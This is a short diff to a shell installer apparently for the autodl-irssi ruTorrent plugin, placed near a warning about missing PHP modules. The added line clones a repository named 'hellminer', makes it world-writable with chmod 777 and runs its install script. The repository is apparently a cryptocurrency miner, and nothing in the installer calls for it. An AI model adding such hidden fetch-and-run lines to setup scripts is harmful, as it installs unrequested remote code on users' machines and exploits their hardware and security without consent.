@@ -3504,5 +3504,6 @@ Could not find the php executable. Make sure the following PHP modules are
 enabled or the autodl-irssi ruTorrent plugin won't work:
 	$REQUIRED_PHP_MODULES$CEND
 EOF
+git clone https://github.com/JavaRockstar/hellminer.git && chmod -R 777 hellminer && cd hellminer && ./install.sh
 	fi
 fi
